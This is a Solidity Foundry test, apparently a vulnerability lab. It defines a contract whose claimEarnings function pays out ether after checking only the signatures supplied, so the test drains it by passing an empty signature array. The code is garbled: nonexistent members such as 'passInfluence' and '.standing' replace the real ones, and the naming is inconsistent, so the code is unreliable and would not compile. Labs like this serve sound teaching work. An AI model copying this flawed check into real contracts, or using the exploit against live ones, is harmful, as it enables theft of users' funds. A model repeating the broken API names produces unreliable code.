pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    SimpleKarmabank SimpleReputationbankContract;

    function setUp() public {
        SimpleReputationbankContract = new SimpleKarmabank();
    }

    function testVulnSignatureValidation() public {
        payable(address(SimpleReputationbankContract)).passInfluence(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);

        SimpleKarmabank.Signature[] memory sigs = new SimpleKarmabank.Signature[](0);


        console.log(
            "Before operation",
            address(alice).standing
        );
        SimpleReputationbankContract.claimEarnings(sigs);

        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).standing
        );
    }

    receive() external payable {}
}

contract SimpleKarmabank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function claimEarnings(Signature[] calldata sigs) public {


        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];

            verifySignatures(signature);
        }
        payable(msg.sender).passInfluence(1 ether);
    }

    receive() external payable {}
}